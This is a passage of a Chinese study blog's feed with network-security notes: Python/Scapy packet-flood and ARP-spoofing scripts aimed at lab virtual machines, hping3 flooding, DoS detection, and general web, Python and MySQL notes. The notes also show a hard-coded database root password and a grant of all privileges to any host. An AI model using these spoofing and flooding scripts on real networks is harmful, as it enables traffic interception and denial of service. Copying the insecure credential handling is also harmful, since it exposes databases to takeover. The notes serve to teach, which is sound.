number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        drandip <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        packet <span class="token operator">=</span> Ether<span class="token punctuation">(</span>src<span class="token operator">=</span>randMac<span class="token punctuation">,</span> dst<span class="token operator">=</span>randMac<span class="token punctuation">)</span><span class="token operator">/</span>IP<span class="token punctuation">(</span>src<span class="token operator">=</span>srandip<span class="token punctuation">,</span> dst<span class="token operator">=</span>drandip<span class="token punctuation">)</span>        sendp<span class="token punctuation">(</span>packet<span class="token punctuation">,</span> iface<span class="token operator">=</span><span class="token string">"网卡名称"</span><span class="token punctuation">,</span> loop<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">arp_spoof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    iface <span class="token operator">=</span> <span class="token string">"VMware Virtual Ethernet Adapter for VMnet8"</span>    <span class="token comment"># 被攻击主机</span>    target_ip <span class="token operator">=</span> <span class="token string">'192.168.104.131'</span>    target_mac <span class="token operator">=</span> <span class="token string">'00:0C:29:E0:9C:B3'</span><span class="token comment"># 网卡用“:”</span>    <span class="token comment"># 被攻击主机的MAC和IP,kali</span>    spoof_ip <span class="token operator">=</span> <span class="token string">'192.168.104.129'</span>    spoof_mac <span class="token operator">=</span> <span class="token string">'00:0c:29:8e:52:c1'</span>    <span class="token comment"># 真实网关的MAC和IP</span>    gateway_ip <span class="token operator">=</span> <span class="token string">'192.168.104.2'</span>    gateway_mac <span class="token operator">=</span> <span class="token string">'00:50:56:ea:a2:db'</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        packet <span class="token operator">=</span> Ether<span class="token punctuation">(</span>src<span class="token operator">=</span>spoof_mac<span class="token punctuation">,</span> dst<span class="token operator">=</span>target_mac<span class="token punctuation">)</span><span class="token operator">/</span>ARP<span class="token punctuation">(</span>hwsrc<span class="token operator">=</span>spoof_mac<span class="token punctuation">,</span> psrc<span class="token operator">=</span>gateway_ip<span class="token punctuation">,</span> hwdst<span class="token operator">=</span>target_mac<span class="token punctuation">,</span> pdst<span class="token operator">=</span>target_ip<span class="token punctuation">,</span> op<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        sendp<span class="token punctuation">(</span>packet<span class="token punctuation">,</span>iface<span class="token operator">=</span>iface<span class="token punctuation">)</span>        packet <span class="token operator">=</span> Ether<span class="token punctuation">(</span>src<span class="token operator">=</span>spoof_mac<span class="token punctuation">,</span> dst<span class="token operator">=</span>gateway_mac<span class="token punctuation">)</span><span class="token operator">/</span>ARP<span class="token punctuation">(</span>hwsrc<span class="token operator">=</span>spoof_mac<span class="token punctuation">,</span> psrc<span class="token operator">=</span>target_ip<span class="token punctuation">,</span> hwdst<span class="token operator">=</span>gateway_mac<span class="token punctuation">,</span> pdst<span class="token operator">=</span>gateway_ip<span class="token punctuation">,</span> op<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        sendp<span class="token punctuation">(</span>packet<span class="token punctuation">,</span> iface<span class="token operator">=</span>iface<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    arp_spoof<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>​</p><h3 id="hping3和wrk泛洪">hping3和wrk泛洪</h3><ol type="1"><li>SYN + 随机ip</li></ol><figure><img src="https://s2.loli.net/2022/08/11/H7uD8xkYnr65Oqo.png"alt="image-20220811172734840" /><figcaption aria-hidden="true">image-20220811172734840</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/11/KSL5cizrWV91DdF.png"alt="image-20220811172806308" /><figcaption aria-hidden="true">image-20220811172806308</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png"alt="image-20220811173548351" /><figcaption aria-hidden="true">image-20220811173548351</figcaption></figure><ol start="2" type="1"><li>web压力测试</li></ol><blockquote><ul><li><code>ab</code></li><li><code>wrk</code></li></ul></blockquote><h3 id="centos一些命令">CentOs一些命令</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">uptime</span><span class="token function">netstat</span> <span class="token parameter variable">-anutl</span>firewall-cmd --add-port<span class="token operator">=</span><span class="token number">80</span>/tcpss</code></pre><figure><img src="https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png"alt="https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png" /><figcaptionaria-hidden="true">https://s2.loli.net/2022/08/11/hzZOlCFUPA56rvq.png</figcaption></figure><h3 id="python检测和抵御dos攻击">python检测和抵御dos攻击</h3><figure><img src="https://s2.loli.net/2022/08/12/AqGsuyr3SOK8fh6.png"alt="image-20220812143724224" /><figcaption aria-hidden="true">image-20220812143724224</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/12/pZB6KX9ozHTuAbS.png"alt="image-20220812143802500" /><figcaption aria-hidden="true">image-20220812143802500</figcaption></figure><ul><li>找出出现频率最高的ip</li></ul><figure><img src="https://s2.loli.net/2022/08/12/ohUpDuABsId8QmV.png"alt="image-20220812155252174" /><figcaption aria-hidden="true">image-20220812155252174</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/12/QsnUewD83rBGutj.png"alt="image-20220812155722065" /><figcaption aria-hidden="true">image-20220812155722065</figcaption></figure><ul><li><code>firewall-cmd命令</code>禁止该ip访问端口</li></ul>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网安-技术</title>
      <link href="/2022/07/06/wang-an-ji-zhu/"/>
      <url>/2022/07/06/wang-an-ji-zhu/</url>
      
        <content type="html"><![CDATA[<h3 id="渗透测试">渗透测试</h3><p>不影响业务正常运行</p><ol type="1"><li>黑盒测试</li><li>白盒测试</li></ol><h3 id="kali">kali</h3><p>预装了许多渗透工具的<code>linux</code>系统</p><h3 id="windows-与网络基础">windows 与网络基础</h3><ol type="1"><li><code>win10</code> 虚拟机</li></ol><blockquote><ol type="1"><li>启用管理员账户</li><li><code>GNS3</code> : 可以跟真实网络上的设备通信</li><li><code>ensp</code></li></ol></blockquote><ol start="2" type="1"><li><code>window</code> 命令</li></ol><blockquote><ol type="1"><li><code>&gt;</code> ： 重定向，将显示的内容存储到文本中</li><li><code>|</code>： 管道符</li></ol></blockquote><ol start="3" type="1"><li>网路相关操作</li></ol><blockquote><ol type="1"><li><code>TCP/IP</code>参数</li><li><code>tracert</code>: 路由跟踪</li></ol></blockquote><ol start="4" type="1"><li><code>NTFS</code> 文件系统</li></ol><h3 id="交换机与路由器">交换机与路由器</h3><ol type="1"><li><p><code>trunk</code>: 让多个vlan在一条线路（交换机与交换机）上传输。<code>access</code>:交换机与主机之间的连接</p></li><li><p><code>单臂路由</code>：</p></li></ol><blockquote><ol type="1"><li>路由器的接口不能配置为<code>trunk</code>。<code>solution</code>:将路由器的端口设置为子接口（逻辑接口）</li></ol></blockquote><ol start="3" type="1"><li><code>三层交换机</code>: 二层交换+三层转发</li></ol><blockquote><ol type="1"><li>一次路由、多次转发，vlan 过多，路由器接口不够使用</li></ol></blockquote><h3 id="wireshark">wireshark</h3><ol type="1"><li>混杂模式</li></ol><h3 id="一些术语">一些术语</h3><ol type="1"><li>脚本语言</li></ol><blockquote><p><code>javaweb</code> 、<code>javascript</code>、<code>python</code></p></blockquote><ol start="2" type="1"><li>后门</li></ol><h3 id="arp欺骗和攻击">ARP欺骗和攻击</h3><ol type="1"><li>工具</li></ol><blockquote><ol type="1"><li><code>disniff</code><ol type="1"><li><code>driftnet</code></li></ol></li><li><code>cat proc/svs/net/ipv4/ip_forward</code> 置1</li></ol></blockquote><h3 id="syn-flood">SYN FLOOD</h3><h3 id="dhcp攻击">DHCP攻击</h3><ol type="1"><li>设置静态ip: 修改<em>/etc/network/interfaces</em></li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">iface lo inet loopback auto eth0 iface eth0 inet static //配置eth0使用默认的静态地址 address <span class="token number">192.168</span>.77.133 //设置eth0的IP地址 netmask <span class="token number">255.255</span>.255.0 //配置eth0的子网掩码 gateway <span class="token number">192.168</span>.77.254</code></pre><h3 id="dns-欺骗">DNS 欺骗</h3><h3 id="windows-ad域">windows AD域</h3><h3 id="防火墙">防火墙</h3><hr /><p><strong><em>Linux</em></strong></p><h3 id="网络命令">网络命令</h3><h3 id="tcpdump">tcpdump</h3><h3 id="shell">shell</h3><h3 id="mysql">mySql</h3><h3 id="php">PHP</h3><ol type="1"><li><code>xampp</code>启动`<code>apache</code>与 <code>mysql</code></li></ol><blockquote><ol type="1"><li>卸载原来的mysql</li></ol></blockquote><ol start="2" type="1"><li><code>HTML</code></li></ol><blockquote><ol type="1"><li><p><code>div</code></p></li><li><p><code>table</code></p><ol type="1"><li><p><code>tr</code></p></li><li><p><code>td</code></p><ol start="3" type="1"><li><code>img</code></li></ol></li></ol></li><li><p><code>a</code></p></li><li><p><code>input</code></p></li><li><p><code>select</code></p></li><li><p><code>button</code></p></li></ol></blockquote><ol start="3" type="1"><li><p><code>CSS</code></p></li><li><p><code>javascript</code></p><ol type="1"><li><p><code>DOM</code>操作：获取指定的<code>元素</code>(字符串类型)</p><ol type="1"><li><p><code>js</code>代码执行顺序（触发时机）</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 响应单击事件并传入数字</span><span class="token keyword">function</span> <span class="token function">clickNumber</span><span class="token punctuation">(</span><span class="token parameter">number</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> result <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"result"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> result<span class="token punctuation">.</span>innerHTML <span class="token operator">+</span> number<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span>div onclick <span class="token operator">=</span> <span class="token string">"clickNumber(7)"</span><span class="token operator">></span><span class="token number">7</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span><span class="token operator">&lt;</span>div onclick <span class="token operator">=</span> <span class="token string">"clickNumber(8)"</span><span class="token operator">></span><span class="token number">8</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span></code></pre></li></ol></li><li><p>前后端交互</p></li></ol><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>process.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">        <span class="token keyword">function</span> <span class="token function">InputCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> user <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>value<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"用户名为空！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">var</span> pwd <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>pwd<span class="token punctuation">.</span>value<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"密码不能为空！"</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myform<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>process.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>用户名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>密码<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token keyword">return</span> <span class="token function">InputCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><blockquote><ol type="1"><li>点击提交按钮时会调用<code>javaScript</code>中地<code>InputCheck</code>函数<ol type="1"><li>后端收到用户名、密码时会执行 <code>action</code>指定的<code>php</code>文件</li><li><code>get</code> 和<code>post</code>： 使用<code>form</code>包裹</li><li><code>ajax</code> ：使用<code>js</code> 语言 <code>ajax</code>方式发送 <code>post</code>请求</li></ol></li></ol></blockquote></li><li><p><code>xml</code>、<code>xpath</code></p></li><li><p><code>ajax</code></p></li><li><p>显示表单</p></li><li><p>连接数据库</p></li><li><p>文章系统</p></li><li><p>权限控制与<code>session</code></p></li><li><p>文件操作</p></li><li><p><code>json</code></p></li><li><p>序列化和反序列化</p></li><li><p><code>thinkPhp</code> : <code>MVC</code></p></li></ol><h3 id="python">python</h3><p><ahref="https://www.liaoxuefeng.com/wiki/1016959663602400/1017092876846880">廖雪峰</a></p><ol type="1"><li>学习目标</li></ol><blockquote><ol type="1"><li>利用<code>python</code>完成安全脚本开发，提高工作效率</li><li>利用<code>python</code>进行自动化运维、日志分析</li><li>针对特定的服务器环境，用于开发安全测试工具</li><li>使用<code>python</code>进行安全基线检查</li><li>使用<code>python</code>进行资产收集、资产管理、信息采集</li><li>在从事网络安全相关工作中，完全可以使用<code>Python</code></li></ol></blockquote><ol start="2" type="1"><li><p><code>python</code>的特点</p></li><li><p><code>pip</code>：安装第三方库；国内镜像</p></li><li><p><code>python package</code> : 对python源代码进行分类管理</p></li><li><p>交互模式与直接运行</p></li><li><p>大小写敏感</p></li><li><p>参数</p></li></ol><blockquote><ol type="1"><li>默认参数一定要用不可变对象，如果是可变对象，程序运行时会有逻辑错误！</li><li><code>*args</code>是可变参数，args接收的是一个tuple；</li><li><code>**kw</code>是关键字参数，kw接收的是一个dict</li><li>关键字参数既可以直接传入：<code>func(a=1, b=2)</code>，又可以先组装dict，再通过<code>**kw</code>传入：<code>func(**&#123;'a': 1, 'b': 2&#125;)</code>。</li><li><code>函数</code>作为一种类型传参</li><li>参数顺序：<strong>位置</strong>——》<strong>默认</strong>——》<strong>可变</strong>——》<strong>字典</strong></li></ol></blockquote><ol start="8" type="1"><li>模块，包</li></ol><blockquote><ol type="1"><li><code>import</code></li></ol></blockquote><ol start="9" type="1"><li>魔术变量</li></ol><blockquote><ol type="1"><li><code>__name__</code> : 注意左右各两个 <code>_</code></li></ol></blockquote><ol start="10" type="1"><li>实现用户注册与校验</li></ol><blockquote><ol type="1"><li><code>ord()</code></li><li><code>range(65,91)</code></li><li>代码</li></ol></blockquote><figure><img src="https://s2.loli.net/2022/08/05/jYTv74ADwr2zb5E.png"alt="目录结构" /><figcaption aria-hidden="true">目录结构</figcaption></figure><ol start="11" type="1"><li>python <strong>文件</strong>读写操作</li></ol><blockquote><ol type="1"><li>读取<code>csv</code>文件报错：<code>UnicodeDecodeError：'gbk' codec can't decode byte 0x80 in position 0 illegal multibyte sequence</code>：</li></ol><p><code>so:</code> 注意创建csv 文件的方式</p><ol start="2" type="1"><li>文本文件保存数据<ol type="1"><li><code>csv</code></li><li><code>xml</code></li><li><code>json</code>字符串</li></ol></li><li>修改密码</li></ol></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 修改密码</span><span class="token keyword">def</span> <span class="token function">change_password</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>newpass<span class="token punctuation">)</span><span class="token punctuation">:</span>    csv_list <span class="token operator">=</span> read_csv<span class="token punctuation">(</span><span class="token string">'./userpass.csv'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> csv_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> username<span class="token punctuation">:</span>            index <span class="token operator">=</span> csv_list<span class="token punctuation">.</span>index<span class="token punctuation">(</span>user<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    csv_list<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> newpass    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./userpass.csv'</span><span class="token punctuation">,</span>mode <span class="token operator">=</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'username,password,phone\n'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> user <span class="token keyword">in</span> csv_list<span class="token punctuation">:</span>            line <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user<span class="token punctuation">[</span><span class="token string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span></code></pre><blockquote><ol start="4" type="1"><li>避免重复执行</li></ol></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></code></pre><ol start="12" type="1"><li>python 操作<code>Mysql</code></li></ol><blockquote><ol type="1"><li>三步走</li><li>远程连接<code>centos</code>下<code>lampp</code>中的<code>mysql</code>:<code>./opt/lampp/bin/mysql</code> 进入数据库</li></ol></blockquote><figure><img src="https://s2.loli.net/2022/08/05/saP2mNJWk8bOMyp.png"alt="image-20220804181758954" /><figcaption aria-hidden="true">image-20220804181758954</figcaption></figure><blockquote><ol type="1"><li><p>创建<code>learn</code>数据库</p></li><li><p>远程连接失败</p><p><code>so:</code></p></li></ol></blockquote><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GRANT</span> <span class="token keyword">ALL</span> <span class="token keyword">PRIVILEGES</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'user'</span><span class="token variable">@'%'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'password'</span> <span class="token keyword">WITH</span> <span class="token keyword">GRANT</span> <span class="token keyword">OPTION</span><span class="token punctuation">;</span>  <span class="token comment">// %:表示从任何主机连接到mysql服务器</span>FLUSH   <span class="token keyword">PRIVILEGES</span><span class="token punctuation">;</span></code></pre><blockquote><ol start="3" type="1"><li><code>mysql游标</code>：有时，需要在检索出来的行中<strong>前进或者后退一行或多行</strong>。这就是使用游标的原因。游标（cursor）是一个存储在mysql服务器上的数据库查询，它不是一条SELECT语句，而是被SELECT语句检索出来的<strong>结果集</strong>。在存储了游标之后，应用程序可以根据需要滚动或浏览其中的数据</li></ol></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql<span class="token comment"># 建立连接</span>conn <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.104.130'</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span> passwd<span class="token operator">=</span><span class="token string">'bycz1997'</span><span class="token punctuation">,</span> database<span class="token operator">=</span><span class="token string">'learn'</span><span class="token punctuation">,</span> charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>host_info<span class="token punctuation">)</span><span class="token comment"># 操作数据库</span>cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>sql <span class="token operator">=</span> <span class="token string">"select username,password,role from user where userid &lt; 3"</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>result <span class="token operator">=</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>结果集字典形式：<code>cursor = coonn.cursor(DictCursor)</code></p></blockquote><blockquote><ol start="4" type="1"><li>数据库更新</li></ol></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># 更新操作</span><span class="token comment"># 必须确认提交，两种方式</span>conn <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.104.130'</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span> passwd<span class="token operator">=</span><span class="token string">'bycz1997'</span><span class="token punctuation">,</span> database<span class="token operator">=</span><span class="token string">'learn'</span><span class="token punctuation">,</span> charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>conn<span class="token punctuation">.</span>host_info<span class="token punctuation">)</span>cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>sql <span class="token operator">=</span> <span class="token string">"update user set password='12345678' where userid = 3"</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><blockquote><p>也可以撤销提交，回滚</p></blockquote><blockquote><ol start="5" 